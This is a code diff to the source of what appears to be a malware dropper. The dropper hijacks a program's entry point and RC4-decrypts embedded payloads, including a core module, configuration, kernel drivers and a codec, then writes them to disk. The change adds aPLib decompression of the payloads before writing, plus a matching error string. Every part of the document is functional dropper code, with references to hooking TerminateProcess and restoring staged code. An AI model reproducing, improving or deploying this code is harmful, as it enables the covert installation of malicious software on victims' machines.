@@ -11,6 +11,7 @@ namespace bf = boost::filesystem;
 
 #include "DropperCode.h"
 #include "XRefNames.h"
+#include "depack.h"
 #include "rc4.h"
 
 #ifdef WIN32
@@ -138,6 +139,7 @@ char * _needed_strings[] = {
 	"Restoring stage1 code", //28
 	"Restoring stage2 code", //29
 	"TerminateProcess hooked", // 30
+	"Error uncompressing", // 31
 #endif
 
 	NULL
@@ -471,8 +473,10 @@ NEXT_ENTRY:
 	if (header->files.core.offset != 0 && header->files.core.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.core.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.core.offset);
-		RC4_SKIP(fileData, header->files.core.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.core.size, header);
+		DWORD size = header->files.core.size;
+		DWORD originalSize = header->files.core.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -481,8 +485,10 @@ NEXT_ENTRY:
 	if (header->files.core64.offset != 0 && header->files.core64.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.core64.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.core64.offset);
-		RC4_SKIP(fileData, header->files.core64.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.core64.size, header);
+		DWORD size = header->files.core64.size;
+		DWORD originalSize = header->files.core64.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -491,8 +497,10 @@ NEXT_ENTRY:
 	if (header->files.config.offset != 0 && header->files.config.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.config.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.config.offset);
-		RC4_SKIP(fileData, header->files.config.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.config.size, header);
+		DWORD size = header->files.config.size;
+		DWORD originalSize = header->files.config.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -501,8 +509,10 @@ NEXT_ENTRY:
 	if (header->files.driver.offset != 0 && header->files.driver.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.driver.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.driver.offset);
-		RC4_SKIP(fileData, header->files.driver.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.driver.size, header);
+		DWORD size = header->files.driver.size;
+		DWORD originalSize = header->files.driver.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -511,8 +521,10 @@ NEXT_ENTRY:
 	if (header->files.driver64.offset != 0 && header->files.driver64.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.driver64.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.driver64.offset);
-		RC4_SKIP(fileData, header->files.driver64.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.driver64.size, header);
+		DWORD size = header->files.driver64.size;
+		DWORD originalSize = header->files.driver64.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -521,8 +533,10 @@ NEXT_ENTRY:
 	if (header->files.codec.offset != 0 && header->files.codec.size != 0) {
 		CHAR* fileName = (char *) (((char*)header) + header->files.names.codec.offset);
 		CHAR* fileData = (char *) (((char*)header) + header->files.codec.offset);
-		RC4_SKIP(fileData, header->files.codec.size, header->rc4key, RC4KEYLEN, header);
-		BOOL ret = pfn_DumpFile(fileName, fileData, header->files.codec.size, header);
+		DWORD size = header->files.codec.size;
+		DWORD originalSize = header->files.codec.original_size;
+		RC4_SKIP(fileData, size, header->rc4key, RC4KEYLEN, header);
+		BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, header);
 		if (ret == FALSE)
 			goto OEP_CALL;
 	}
@@ -613,21 +627,36 @@ OEP_CALL:
 FUNCTION_END(NewEntryPoint);
 
 
-BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectionHeader *header)
+BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD originalSize, DataSectionHeader *header)
 {
 	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
 	char * strings = (char *) (((char*)header) + header->strings.offset);
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
 	
 	OUTPUTDEBUGSTRING pfn_OutputDebugString = (OUTPUTDEBUGSTRING) dll_calls[CALL_OUTPUTDEBUGSTRINGA];
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
 	SETFILEATTRIBUTES pfn_SetFileAttributes = (SETFILEATTRIBUTES) dll_calls[CALL_SETFILEATTRIBUTESA];
 	CREATEFILE pfn_CreateFile = (CREATEFILE) dll_calls[CALL_CREATEFILEA];
 	WRITEFILE pfn_WriteFile = (WRITEFILE) dll_calls[CALL_WRITEFILE];
 	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) dll_calls[CALL_CLOSEHANDLE];
 	
+#if defined PACK_DATA
+	// decompress data
+	char* uncompressed = (char*) pfn_VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
+	
+	int uncompressed_size = aP_depack(fileData, uncompressed);
+	if (uncompressed_size != originalSize) {
+		MESSAGE(STRING(STRIDX_UNCOMPRESS_ERR));
+		return FALSE;
+	}
+#else
+	char* uncompressed = fileData;
+#endif
+	
 	// create or open the file for overwriting
 	MESSAGE(fileName);
-
+	
 	// restore normal attributes if the file already exists
 	pfn_SetFileAttributes(fileName, FILE_ATTRIBUTE_NORMAL);
 	
@@ -645,7 +674,7 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DataSectio
 	
 	// write data to file
 	DWORD cbWritten = 0;
-	BOOL bRet = pfn_WriteFile(hFile, fileData, fileSize, &cbWritten, NULL);
+	BOOL bRet = pfn_WriteFile(hFile, uncompressed, originalSize, &cbWritten, NULL);
 	if (bRet == FALSE)
 		return FALSE;
 	
